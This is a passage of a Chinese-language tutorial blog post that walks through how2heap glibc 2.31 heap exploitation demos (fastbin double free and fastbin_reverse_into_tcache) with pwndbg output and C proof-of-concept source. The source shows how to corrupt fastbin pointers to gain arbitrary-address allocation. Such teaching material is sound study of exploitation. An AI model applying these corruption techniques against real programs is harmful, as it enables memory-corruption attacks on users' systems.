class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后用 calloc 分配 3 个chunk ， 使用 calloc 分配的时候，此时不会从 tcachebins 拿已经 free 的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">► <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时我们注意到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 —▸ 0x555555559340 —▸ 0x555555559320 —▸ 0x555555559300 —▸ 0x5555555592e0 —▸ 0x5555555592c0 —▸ 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 —▸ 0x5555555593b0 ◂— 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>此时存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a 指向 chunk b ，同时 chunk b 也指向了 chunk a</p><p>然后如果我们再把他们占回来，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> ► <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe230</span> ◂— <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe240</span> —▸ <span class="number">0x5555555593c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe250</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe258</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe268</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— ...</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>就会存在两个指针指向同一块 chunk，通常而言我们的下一步利用会找一个 size 符合当前fastbin 链的地址（_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。），然后在分配出 chunk a 的同时修改 chunk a 的 fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax r8  <span class="number">0x5555555593a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x5555555593b8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555559390</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## 修改 fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## 设置size 符合 fastbin链</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x5555555593c0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x5555555593c8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x5555555593d8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x5555555593e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x5555555593f8</span> ◂— <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>此时fastbin 链的结构就会被修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x555555559320</span> —▸ <span class="number">0x555555559300</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x5555555592c0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> —▸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>当执行到 分配 c chunk 的时候 ，我们就会拿到目标内存，总结一下就是</p><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">        <span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">        a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">        assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h3><p>首先分配一定数量的 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">19</span>   <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="number">20</span>   <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="number">21</span>   <span class="keyword">size_t</span> i;</span><br><span class="line">► <span class="number">22</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="number">23</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="number">24</span>   &#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">31</span>   <span class="comment">// Fill the tcache.</span></span><br><span class="line"> ► <span class="number">32</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">33</span>     <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">   <span class="number">34</span>   &#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x555555559480</span> —▸ <span class="number">0x555555559430</span> —▸ <span class="number">0x5555555593e0</span> —▸ <span class="number">0x555555559390</span> —▸ <span class="number">0x555555559340</span> —▸ <span class="number">0x5555555592f0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>释放我们的目标 chunk 即这里的 ptrs[7]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>释放剩下的 8-14 的chunk</p><p>然后假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将 栈上构造好的一个 list的地址赋予 victim </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">75</span>   <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">   <span class="number">76</span></span><br><span class="line">   <span class="number">77</span>   <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line"> ► <span class="number">78</span>   *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>   <span class="comment">//------------------------------------</span></span><br><span class="line">  ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p victim</span><br><span class="line">$<span class="number">1</span> = <span class="number">0x5555555594d0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555594d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax  <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555594d8</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure><p>接下来，我们 malloc 7次 清空 tcache bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">86</span>   <span class="comment">// Empty tcache.</span></span><br><span class="line">   <span class="number">87</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">   <span class="number">88</span>     ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">   <span class="number">89</span>   &#125;</span><br><span class="line">   <span class="number">90</span></span><br><span class="line"> ► <span class="number">91</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">92</span>     <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">   <span class="number">93</span>     <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">   <span class="number">94</span>   );</span><br><span class="line">   <span class="number">95</span></span><br><span class="line">   <span class="number">96</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x7</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe1f8</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555540</span>a main+<span class="number">481</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x5555555596a0</span> —▸ <span class="number">0x555555559650</span> —▸ <span class="number">0x555555559600</span> —▸ <span class="number">0x5555555595b0</span> —▸ <span class="number">0x555555559560</span> 